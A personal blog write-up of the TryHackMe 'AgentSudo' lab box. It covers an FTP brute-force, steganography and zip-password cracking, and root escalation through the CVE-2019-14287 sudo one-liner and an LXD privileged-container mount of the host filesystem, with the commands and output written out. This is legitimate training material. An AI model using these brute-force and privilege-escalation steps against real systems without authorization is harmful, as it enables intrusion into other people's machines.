---
layout: post
title:  "TryHackMe - AgentSudo"
date:   2020-04-13 18:58:00 +1000
category: hacking
---

# Rules
hackthebox.eu has a separation between 'active' and 'retired' machines; it's against the rules to publish a write-up on an active machine. I've only recently started with tryhackme.com, which is a little different. There isn't a distinction between active and retired machines, and as far as I can tell, there is no policy preventing people writing up their results. Furthermore, this writeup is for a machine that has other existing writeups, so there are no spoilers here. 


This is my first writeup of a box I've rooted. 

# Ports
I've noticed with other writeups that people often include big chunks of nmap output, but I don't really see the need. My method is usually to run a TCP scan on all ports immediately followed by a detailed scan on the open ports. I usually only run a UDP scan if I'm drawing a blank. I'm only going to include specific details from nmap scanning if it's really relevant. Otherwise, I'll just list the open ports and maybe the services.

For this box, the relevant open ports were **21 (FTP), 22 (SSH) and 80 (HTTP)**. The server was Apache 2.4.29 running on Ubuntu.

# FTP
When I see an open FTP port on a scan, I usually try an anonymous login. However, this was not permitted on this box.

# HTTP
Visiting the website via Firefox you are greeted with the message:

*Dear agents,
Use your own **codename** as user-agent to access the site.
From,
Agent R*

I usually run Burp Suite for these things, in which case changing the {% highlight HTTP %}User-Agent{% endhighlight %} with Repeater is trivial. I must admit I tried lots of different names before discovering the codename was supposed to be a single letter (like the *R* in *Agent R*). Anyway, once I found the correct value, the following message appeared:

*Attention chris,
Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
From,
Agent R*

# FTP
Since we now had a username and a hint that the password was weak, it was back to the FTP server to try to login as Chris. I used the FTPBruter tool to achieve this (https://GitHackTools.blogspot.com).

{% highlight shell %}	
```
    [-] Enter the target address: 10.10.102.150
    [?] Do you want to use username list? [Y/n]: n
    [-] Enter username: chris
    [-] Enter the path of wordlist: /usr/share/seclists/Passwords/probable-v2-top207.txt
    [i] Brute force is performing...

    [i] Brute force has done!
    Username :  chris
    Password :  *******
```
{% endhighlight %}
    
You can try this for yourself if you want to know the password. At the FTP site were three files:

1. To_agentJ.txt
2. cute-alien.jpg, and
3. cutie.png

The text file said:

*Dear agent J,
All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
From,
Agent C*

So this provides a clue that we are looking at a steganography challenge. Running binwalk on one of the files produces:

{% highlight shell %}
```
root@kali:/opt/tryhackme/agentsudo# binwalk cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
{% endhighlight %}

Extracting the files produces an image which isn't of any further use, and a password protected zipfile.

The zipfile can be cracked using John to obtain the password 'alien':

{% highlight shell %}
root@kali:/opt/tryhackme/agentsudo/_cutie.png.extracted# zip2john 8702.zip > zip4john
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
root@kali:/opt/tryhackme/agentsudo/_cutie.png.extracted# ls
365  365.zlib  8702.zip  To_agentR.txt  zip4john
root@kali:/opt/tryhackme/agentsudo/_cutie.png.extracted# john zip4john 
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:02 DONE 2/3 (2020-04-13 07:06) 0.4347g/s 19125p/s 19125c/s 19125C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed
{% endhighlight %}

Unzipping the file using the password provides the following message:

*Agent C,
We need to send the picture to 'QXJlYTUx' as soon as possible!
By,
Agent R*

We can decode the base-encoded string in a variety of ways, but from the CLI we can do: 
{% highlight shell %}
root@kali:/opt/tryhackme/agentsudo# echo QXJlYTUx | base64 -d; printf '\n'
Area51
{% endhighlight %}

'Area51' then becomes the passphrase to unlock hidden content in the other image file that was found in the FTP directory, which can be unlocked with **steghide**:

{% highlight shell %}
root@kali:/opt/tryhackme/agentsudo# steghide --extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
root@kali:/opt/tryhackme/agentsudo# cat message.txt 
{% endhighlight %}
{% raw %}
>Hi james,
>Glad you find this message. Your login password is hackerrules!
>Don't ask me why the password look cheesy, ask agent R who set this password for you.
>Your buddy,
>chris  
{% endraw %}  


Alternatively, we could skip the entire step of decoding the first zipfile with binwalk > JtR and bruteforce the second file with **stegcracker**; both methods work.

# SSH

The new credentials we have (james:hackerrules!) are for SSH, so we can log in to the box and at this point grab the first flag. Now it's time for the privesc. 

# Intended Method

The box was designed to allow for exploitation of CVE-2019-14287, a Sudo vulnerability. A description is found here [here](https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287), but essentially if sudo is passed a User ID of “-1” or its unsigned number “4294967295”, the command will run as root. So the exploit is simply:
{% highlight shell %}
james@agent-sudo:~$sudo -u \#$((0xffffffff)) /bin/bash
{% endhighlight %}
At which point you have root privileges and it's game over.

# Alternative method

Running LinEnum.sh produces the following output:
*[+] We're a member of the (lxd) group - could possibly misuse these rights!
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)*

As it turns out, there is an LXD/LXC privesc that the box is also vulnerable to. You can read about it here: https://dominicbreuker.com/post/htb_calamity/, and here is the method in action:

{% highlight shell %}
james@agent-sudo:/dev/shm$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: 
Create a new BTRFS pool? (yes/no) [default=yes]: 
Would you like to use an existing block device? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=15GB]: 8
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: no
Would you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: 
Would you like LXD to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
james@agent-sudo:/dev/shm$ ls
alpine.tar.gz  LinEnum.sh
james@agent-sudo:/dev/shm$ lxc image import alpine.tar.gz  --alias yolo
To start your first container, try: lxc launch ubuntu:18.04

Image imported with fingerprint: 1b27aba42a2e301f676bc6ae4fe49aa345ddd3839f0a13b0361123acc38e8c38
james@agent-sudo:/dev/shm$ lxc init yolo yolo -c security.privileged=true
Creating yolo

The container you are starting doesn't have any network attached to it.
To create a new network, use: lxc network create
To attach a network to a container, use: lxc network attach

james@agent-sudo:/dev/shm$ lxc config device add yolo mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to yolo
james@agent-sudo:/dev/shm$ lxc start yolo
james@agent-sudo:/mnt$ lxc list
+------+---------+------+------+------------+-----------+
| NAME |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+------+---------+------+------+------------+-----------+
| yolo | RUNNING |      |      | PERSISTENT | 0         |
+------+---------+------+------+------------+-----------+
james@agent-sudo:/mnt$ id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
james@agent-sudo:/mnt$ lxc exec yolo /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cat /mnt/root/root/root.txt

To Mr.hacker,
Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
~ #

{% endhighlight %}
